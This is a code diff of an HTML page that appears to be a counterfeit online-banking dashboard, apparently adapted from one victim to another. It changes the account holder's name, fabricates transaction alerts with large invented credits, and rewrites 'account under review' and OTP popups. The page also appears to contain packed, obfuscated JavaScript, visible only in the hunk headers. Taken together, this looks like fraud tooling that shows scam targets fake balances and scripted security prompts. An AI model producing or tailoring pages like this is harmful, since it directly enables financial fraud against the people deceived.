@@ -1203,8 +1203,8 @@ body.chatra-mobile-widget-expanded {
                                     </svg>
                                     <div class="media-body">
                                       <div class="data-info">
-                                        <h6 class=""><span class="text-danger">Debit [Alert]</span></h6>
-                                          <p class="">$743</p>
+                                        <h6 class=""><span class="text-success">Credit [Alert]</span></h6>
+                                          <p class="">$44,270.28</p>
                                         </div>
 
                                         <div class="icon-status">
@@ -1214,8 +1214,7 @@ body.chatra-mobile-widget-expanded {
                             </div>
 
                         </div>
-						
-<div class="notification-scroll">
+                        <div class="notification-scroll">
                             <div class="dropdown-item">
                                 <div class="media ">
                                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-activity">
@@ -1224,7 +1223,7 @@ body.chatra-mobile-widget-expanded {
                                     <div class="media-body">
                                       <div class="data-info">
                                         <h6 class=""><span class="text-danger">Debit [Alert]</span></h6>
-                                          <p class="">$800</p>
+                                          <p class="">$1,428.85</p>
                                         </div>
 
                                         <div class="icon-status">
@@ -1244,7 +1243,7 @@ body.chatra-mobile-widget-expanded {
                                     <div class="media-body">
                                       <div class="data-info">
                                         <h6 class=""><span class="text-danger">Debit [Alert]</span></h6>
-                                          <p class="">$12,125</p>
+                                          <p class="">$12,125.00</p>
                                         </div>
 
                                         <div class="icon-status">
@@ -1263,8 +1262,8 @@ body.chatra-mobile-widget-expanded {
                                     </svg>
                                     <div class="media-body">
                                         <div class="data-info">
-                                            <h6 class=""><span class="text-danger">Debit [Alert]</span></h6>
-                                            <p class="">$24.85</p>
+                                            <h6 class=""><span class="text-success">Credit [Alert]</span></h6>
+                                            <p class="">$16,000.00</p>
                                         </div>
 
                                         <div class="icon-status">
@@ -1283,8 +1282,8 @@ body.chatra-mobile-widget-expanded {
                                     </svg>
                                     <div class="media-body">
                                       <div class="data-info">
-                                        <h6 class=""><span class="text-success">Credit [Alert]</span></h6>
-                                          <p class="">$84,000</p>
+                                        <h6 class=""><span class="text-danger">Debit [Alert]</span></h6>
+                                          <p class="">$225.34</p>
                                         </div>
 
                                         <div class="icon-status">
@@ -1312,7 +1311,7 @@ body.chatra-mobile-widget-expanded {
                             <div class="media mx-auto">
                                 <img src="assets/profile/9909333442photo_2023-08-30 20.04.15.jpeg" class="img-fluid mr-2" alt="avatar">
                                 <div class="media-body">
-                                    <h5>Abelard ARCHIE</h5>
+                                    <h5>John DOMENICO</h5>
                                     <p>Checkings</p>
                                 </div>
                             </div>
@@ -1364,7 +1363,7 @@ body.chatra-mobile-widget-expanded {
                     <figure class="user-cover-image"></figure>
                     <div class="user-info" aria-expanded="true">
                         <img src="assets/profile/9909333442photo_2023-08-30 20.04.15.jpeg" alt="avatar">
-                        <h5>Abelard ARCHIE</h5>
+                        <h5>John DOMENICO</h5>
                         <p class="">Checkings</p>
                     </div>
                 </div>
@@ -1577,11 +1576,11 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 
 <div class="popup-overlay" id="otpPopup">
   <div class="popup">
-    <h3>ACCOUNT UNDER REVIEW!</h3>
-    <p><strong></strong>Transaction disabled due to an unauthorized device access! Please visit our nearest branch or verify your FaceID/Fingerprint with your registered device.</p>
-    <input type="text" id="otpInput" placeholder="OTP Disabled">
+    <h3>Enter the 6-digit OTP code</h3>
+    <p><strong></strong>Transaction Receipt not accessible on the web page, please login with your mobile app to print transaction receipt or download the copy sent to your email or phone after successful transaction.</p>
+    <input type="text" id="otpInput" placeholder="Enter OTP">
     <p class="popup-error" id="errorMessage"></p>
-    <button onclick="validateOTP()">Verify</button>
+    <button onclick="validateOTP()">Submit</button>
     <button onclick="redirectToDashboard()">Cancel</button>
   </div>
 </div>
@@ -1589,9 +1588,9 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 
 <div class="popup-overlay" id="errorPopup">
   <div class="popup">
-    <h3>DEVICE UNRECOGNIZED!</h3>
-    <p>Please log-in with your registered device.</p>
-    <button onclick="retryOTP()">Verify Again</button>
+    <h3>INVALID OTP!</h3>
+    <p>Your account will be locked after 3 wrong attempts</p>
+    <button onclick="retryOTP()">Try Again</button>
     <button onclick="redirectToDashboard()">Go to Dashboard</button>
   </div>
 </div>
